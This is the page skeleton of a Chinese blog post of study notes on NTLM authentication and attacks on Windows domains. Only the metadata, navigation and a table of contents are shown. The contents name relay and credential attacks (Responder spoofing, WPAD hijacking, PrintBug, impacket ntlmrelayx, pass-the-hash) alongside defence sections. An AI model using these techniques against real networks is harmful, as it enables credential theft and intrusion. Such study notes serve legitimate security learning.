<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="本文主要简单介绍下NTLM协议和基于NTLM的攻击手法，主要是对以下文章的学习、以及记录学习心得和利用方法。(NTLM Relay部分还没写完) 参考文章：  https:&#x2F;&#x2F;paper.seebug.org&#x2F;papers&#x2F;Archive&#x2F;drops2&#x2F;域渗透——Pass The Hash %26amp%3B Pass The Key.html https:&#x2F;&#x2F;3gstudent.github.i">
<meta property="og:type" content="article">
<meta property="og:title" content="【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)">
<meta property="og:url" content="https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
<meta property="og:description" content="本文主要简单介绍下NTLM协议和基于NTLM的攻击手法，主要是对以下文章的学习、以及记录学习心得和利用方法。(NTLM Relay部分还没写完) 参考文章：  https:&#x2F;&#x2F;paper.seebug.org&#x2F;papers&#x2F;Archive&#x2F;drops2&#x2F;域渗透——Pass The Hash %26amp%3B Pass The Key.html https:&#x2F;&#x2F;3gstudent.github.i">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220228-15:31:18-_vpkMkk_mRzv6f_vpkMkk_1646033478972_vpkMkk_mRzv6f.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220228-15:40:43-_8x6WWc_boz5xT_8x6WWc_1646034043979_8x6WWc_boz5xT.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220228-15:44:46-_x0Tos9_iAnp7z_x0Tos9_1646034286903_x0Tos9_iAnp7z.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-10:30:55-_HfbweE_q6Vsgl_HfbweE_1646101855969_HfbweE_q6Vsgl.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-10:31:55-_fMzxOs_xDKbQF_fMzxOs_1646101915860_fMzxOs_xDKbQF.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-18:16:13-_oshcu8_4qRkdF_oshcu8_1646129773098_oshcu8_4qRkdF.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-18:17:37-_r48hWR_9sNQND_r48hWR_1646129857957_r48hWR_9sNQND.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-20:39:00-_XyXbuK_HvtmA4_XyXbuK_1646138340436_XyXbuK_HvtmA4.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220303-15:42:21-_oHXLkL_95JTSO_oHXLkL_1646293341668_oHXLkL_95JTSO.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-21:15:32-_h1tR3I_zv7H2l_h1tR3I_1646140532145_h1tR3I_zv7H2l.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-21:20:25-_Je0FhI_Lq7hM1_Je0FhI_1646140825982_Je0FhI_Lq7hM1.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220302-14:27:16-_W6dhps_pYcwxs_W6dhps_1646202436067_W6dhps_pYcwxs.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220302-14:28:07-_M36GP0_mbSgS2_M36GP0_1646202487769_M36GP0_mbSgS2.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220302-14:31:47-_rFI2jh_N3vREr_rFI2jh_1646202707844_rFI2jh_N3vREr.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220302-17:08:29-_TLt0Oj_FNHeyA_TLt0Oj_1646212109114_TLt0Oj_FNHeyA.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220311-17:54:39-_NSUlYG_image-20220311175439495_NSUlYG_1646992479902_NSUlYG_image-20220311175439495.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220311-11:03:36-_Ac1pO9_igOVXs_Ac1pO9_1646967816288_Ac1pO9_igOVXs.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-11:02:29-_RlWy0n_fao2Fa_RlWy0n_1646103749341_RlWy0n_fao2Fa.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-11:16:10-_sgloQU_vmHtjR_sgloQU_1646104570346_sgloQU_vmHtjR.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-11:20:41-_hUXPKD_mFcIUW_hUXPKD_1646104841783_hUXPKD_mFcIUW.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-11:45:51-_Ul0i6a_yXC7Ii_Ul0i6a_1646106351100_Ul0i6a_yXC7Ii.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-11:47:31-_gEqz2i_9GWkOc_gEqz2i_1646106451085_gEqz2i_9GWkOc.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-11:55:20-_DDWeBU_AY8Egu_DDWeBU_1646106920032_DDWeBU_AY8Egu.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-10:52:24-_WMlI0w_e1Gfer_WMlI0w_1646103144707_WMlI0w_e1Gfer.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-10:57:42-_kUNQOx_7vSCj7_kUNQOx_1646103462485_kUNQOx_7vSCj7.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220303-16:31:44-_5qygz1_tvdw16_5qygz1_1646296304511_5qygz1_tvdw16.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220303-17:16:29-_qOnRbO_Lhazy7_qOnRbO_1646298989782_qOnRbO_Lhazy7.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220303-17:20:19-_Ctuelz_gbonvT_Ctuelz_1646299219363_Ctuelz_gbonvT.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220303-17:28:51-_mbVsXn_zIn4i2_mbVsXn_1646299731095_mbVsXn_zIn4i2.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220303-17:34:41-_C20tRl_YBxFQE_C20tRl_1646300081235_C20tRl_YBxFQE.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220308-19:44:08-_v5MaK5_ePTgZa_v5MaK5_1646739848993_v5MaK5_ePTgZa.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-13:39:51-_ENmKVA_QST3yO_ENmKVA_1646113191474_ENmKVA_QST3yO.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-13:41:00-_8o1DrI_KJGWiz_8o1DrI_1646113260162_8o1DrI_KJGWiz.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220301-13:42:50-_HYONKH_6iotDa_HYONKH_1646113370857_HYONKH_6iotDa.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220308-19:34:33-_JDXehi_uzEgR0_JDXehi_1646739273299_JDXehi_uzEgR0.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220308-19:35:52-_WljWiL_IDaGcU_WljWiL_1646739352069_WljWiL_IDaGcU.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220307-16:50:42-_91GGxW_7j8gqW_91GGxW_1646643042643_91GGxW_7j8gqW.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220307-20:49:23-_0IYudR_image-20220307204923200_0IYudR_1646657363545_0IYudR_image-20220307204923200.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220307-21:16:54-_3KQn47_image-20220307211654344_3KQn47_1646659014628_3KQn47_image-20220307211654344.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220308-17:53:57-_Wpdm4t_image-20220308175356939_Wpdm4t_1646733237344_Wpdm4t_image-20220308175356939.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-11:14:30-_uuGSJx_TcblgI_uuGSJx_1645586070285_uuGSJx_TcblgI.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-11:52:24-_OyLDhL_38qD4k_OyLDhL_1645588344569_OyLDhL_38qD4k.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-11:06:58-_h5KW10_itiVM0_h5KW10_1645585618383_h5KW10_itiVM0.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-20:31:43-_B0Gv4p_H9dFFu_B0Gv4p_1645878703798_B0Gv4p_H9dFFu.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-11:54:13-_9fWpEM_Aqg0nH_9fWpEM_1645588453856_9fWpEM_Aqg0nH.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:01:45-_rDYgqw_5Ml4yc_rDYgqw_1645596105101_rDYgqw_5Ml4yc.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:14:48-_1rxnDV_1Bdn9i_1rxnDV_1645596888098_1rxnDV_1Bdn9i.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:17:18-_AwLoGm_OdQOgW_AwLoGm_1645597038108_AwLoGm_OdQOgW.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:20:37-_2FbKCP_RrbfVo_2FbKCP_1645597237604_2FbKCP_RrbfVo.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:21:38-_vkCwLK_aRWOK1_vkCwLK_1645597298581_vkCwLK_aRWOK1.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:30:03-_WVHfVR_HIyWEi_WVHfVR_1645597803807_WVHfVR_HIyWEi.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:40:30-_sjeuSi_OfCGzg_sjeuSi_1645598430237_sjeuSi_OfCGzg.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:42:02-_9dBQjY_djADeZ_9dBQjY_1645598522588_9dBQjY_djADeZ.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:44:46-_FAEyEX_K1rU6x_FAEyEX_1645598686700_FAEyEX_K1rU6x.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-14:43:29-_GHCGQE_atq51U_GHCGQE_1645598609818_GHCGQE_atq51U.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-16:21:04-_4JvAah_9lAQ9c_4JvAah_1645604464237_4JvAah_9lAQ9c.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-16:18:25-_9aal6d_vK8Y8J_9aal6d_1645604305345_9aal6d_vK8Y8J.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-16:16:21-_SCeLWy_CaayLJ_SCeLWy_1645604181042_SCeLWy_CaayLJ.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-16:14:01-_HWvZzs_XpSt0V_HWvZzs_1645604041132_HWvZzs_XpSt0V.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-16:17:39-_AD86UZ_6u9h4g_AD86UZ_1645604259624_AD86UZ_6u9h4g.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-16:12:24-_1eGT4M_OngXDO_1eGT4M_1645603944944_1eGT4M_OngXDO.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-16:34:00-_uO1uvD_DjMo9W_uO1uvD_1645605240497_uO1uvD_DjMo9W.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220223-17:18:02-_hT7S6x_pkiwcG_hT7S6x_1645607882804_hT7S6x_pkiwcG.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-13:56:42-_3p5fyE_OB6TfS_3p5fyE_1645768602510_3p5fyE_OB6TfS.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-14:18:51-_QowPX0_60AQgz_QowPX0_1645769931277_QowPX0_60AQgz.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-13:59:33-_gwVa47_EOl4Cn_gwVa47_1645768773076_gwVa47_EOl4Cn.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-14:39:19-_uu0tbY_859diX_uu0tbY_1645771159019_uu0tbY_859diX.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-14:21:18-_73yxaV_nJfQ53_73yxaV_1645770078796_73yxaV_nJfQ53.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-14:26:20-_JHfvCw_XYvMYe_JHfvCw_1645770380922_JHfvCw_XYvMYe.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-14:29:05-_QHAFTL_Brqlgh_QHAFTL_1645770545939_QHAFTL_Brqlgh.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-14:31:40-_Ts2m2d_MZcF1j_Ts2m2d_1645770700687_Ts2m2d_MZcF1j.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-14:40:21-_imzxIA_ZUZSG1_imzxIA_1645771221454_imzxIA_ZUZSG1.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-15:43:44-_CGXYRW_c4t5Sm_CGXYRW_1645775024400_CGXYRW_c4t5Sm.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-15:44:51-_PGiC36_V9HBYR_PGiC36_1645775091966_PGiC36_V9HBYR.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-15:49:49-_k2JJoS_HiLvfd_k2JJoS_1645775389882_k2JJoS_HiLvfd.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-15:50:39-_wLK2tt_JQhiiy_wLK2tt_1645775439066_wLK2tt_JQhiiy.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-15:51:11-_kzrBRP_Qqk1ci_kzrBRP_1645775471062_kzrBRP_Qqk1ci.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-15:52:49-_iosR88_w8AIOD_iosR88_1645775569218_iosR88_w8AIOD.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-16:11:36-_O9sZEu_rPz3jl_O9sZEu_1645776696426_O9sZEu_rPz3jl.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220321-16:03:44-_XWI9Cd_image-20220321160344378_XWI9Cd_1647849824909_XWI9Cd_image-20220321160344378.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-18:29:57-_oN9DmG_Tku7V2_oN9DmG_1645784997872_oN9DmG_Tku7V2.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-18:33:14-_scUT3g_pMDq9W_scUT3g_1645785194043_scUT3g_pMDq9W.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220225-19:01:47-_Lo1hmA_rEa7NB_Lo1hmA_1645786907036_Lo1hmA_rEa7NB.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-19:45:30-_KnLxj0_iwqRzj_KnLxj0_1645875930684_KnLxj0_iwqRzj.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-19:52:06-_hK6Pv4_yWOVCz_hK6Pv4_1645876326299_hK6Pv4_yWOVCz.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-19:55:34-_EMcDN3_WK9goj_EMcDN3_1645876534789_EMcDN3_WK9goj.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-16:49:36-_9gvky1_fnZMLA_9gvky1_1645865376106_9gvky1_fnZMLA.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-16:28:11-_7gKJk1_luUR5b_7gKJk1_1645864091298_7gKJk1_luUR5b.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-16:29:04-_yDArKB_lXJhZc_yDArKB_1645864144778_yDArKB_lXJhZc.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-19:59:29-_jLcWiH_HAlyKk_jLcWiH_1645876769572_jLcWiH_HAlyKk.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-20:16:40-_Gl0Gp5_vbr5LT_Gl0Gp5_1645877800889_Gl0Gp5_vbr5LT.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-20:21:34-_CY74F9_S8w9Gg_CY74F9_1645878094538_CY74F9_S8w9Gg.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-17:47:03-_AKsCEm_iGXMqk_AKsCEm_1645868823122_AKsCEm_iGXMqk.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-19:17:07-_z2Rc8Z_GEHunJ_z2Rc8Z_1645874227233_z2Rc8Z_GEHunJ.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-17:58:44-_nB0p85_tHLkoX_nB0p85_1645869524674_nB0p85_tHLkoX.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-23:37:34-_XYLjU9_sWkPXi_XYLjU9_1645889854695_XYLjU9_sWkPXi.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220226-23:35:52-_NtBddt_FI4hk5_NtBddt_1645889752104_NtBddt_FI4hk5.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220321-15:30:08-_MJWGom_image-20220321153007894_MJWGom_1647847808243_MJWGom_image-20220321153007894.png">
<meta property="article:published_time" content="2022-03-07T06:18:41.000Z">
<meta property="article:modified_time" content="2022-03-21T08:03:58.000Z">
<meta property="article:author" content="atsud0">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="NTLM">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.atsud0.me/images/post/20220228-15:31:18-_vpkMkk_mRzv6f_vpkMkk_1646033478972_vpkMkk_mRzv6f.png">
    
    
      
        
          
            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=48">
          
        
      
      
        
          
            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=192" sizes="192x192">
          
        
      
      
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=180">
          
        
      
    
    <!-- title -->
    <title>【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163969429-1"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-163969429-1');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="雪之下二丁目鹤岗八幡宫" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SkeletonKey/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/Windows-TelemetryController%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)&body=Check out this article: https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E6%B5%85%E6%B7%A1NTLM-%E5%86%85%E7%BD%91%E5%B0%8F%E7%99%BD%E7%9A%84NTLM%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=【域渗透】浅淡NTLM(内网小白的NTLM学习笔记)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-NTLM-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 NTLM 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">Windows本地认证流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LM-Hash"><span class="toc-number">1.2.</span> <span class="toc-text">LM Hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-Hash"><span class="toc-number">1.3.</span> <span class="toc-text">NTLM Hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-NTLM-hash"><span class="toc-number">1.4.</span> <span class="toc-text">Net-NTLM hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%EF%BC%88NTLM-Challenge%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">NTLM 身份认证（NTLM Challenge）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSP-amp-SSPI"><span class="toc-number">1.6.</span> <span class="toc-text">SSP &amp; SSPI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-NTLM-Relay"><span class="toc-number">2.</span> <span class="toc-text">0x02 NTLM Relay</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Responder-%E5%88%A9%E7%94%A8LLMNR%E5%92%8CNetBIOS%E6%AC%BA%E9%AA%97-WPAD%E5%8A%AB%E6%8C%81-%E8%8E%B7%E5%BE%97Net-NTLMHash"><span class="toc-number">2.1.</span> <span class="toc-text">Responder 利用LLMNR和NetBIOS欺骗 WPAD劫持 获得Net-NTLMHash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WPAD%E5%8A%AB%E6%8C%81"><span class="toc-number">2.2.</span> <span class="toc-text">WPAD劫持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E-PrintBug"><span class="toc-number">2.3.</span> <span class="toc-text">打印机漏洞 PrintBug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali%E9%83%A8%E7%BD%B2SMBServer%E6%8A%93NTLM%E5%93%88%E5%B8%8C"><span class="toc-number">2.4.</span> <span class="toc-text">Kali部署SMBServer抓NTLM哈希</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8BSMB%E7%AD%BE%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">探测SMB签名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Responder-MultiRelayx"><span class="toc-number">2.6.</span> <span class="toc-text">Responder-MultiRelayx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impacket-smbrelayx"><span class="toc-number">2.7.</span> <span class="toc-text">impacket-smbrelayx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impacket-ntlmrelayx"><span class="toc-number">2.8.</span> <span class="toc-text">impacket-ntlmrelayx</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-NTLM-Relay-%E9%98%B2%E5%BE%A1"><span class="toc-number">3.</span> <span class="toc-text">0x03 NTLM Relay 防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-Pass-The-Hash"><span class="toc-number">4.</span> <span class="toc-text">0x04 Pass The Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">基础利用手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E7%A9%B6KB2871997"><span class="toc-number">4.2.</span> <span class="toc-text">探究KB2871997</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-PassTheHash-%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">0x05 PassTheHash 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%92%E7%BB%9DSID500%E7%94%A8%E6%88%B7%E4%BB%8E%E7%BD%91%E7%BB%9C%E7%99%BB%E5%BD%95"><span class="toc-number">5.1.</span> <span class="toc-text">拒绝SID500用户从网络登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">5.2.</span> <span class="toc-text">域内防御方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E6%80%BB%E7%BB%93"><span class="toc-number">5.3.</span> <span class="toc-text">内容总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%80%BB%E7%BB%93"><span 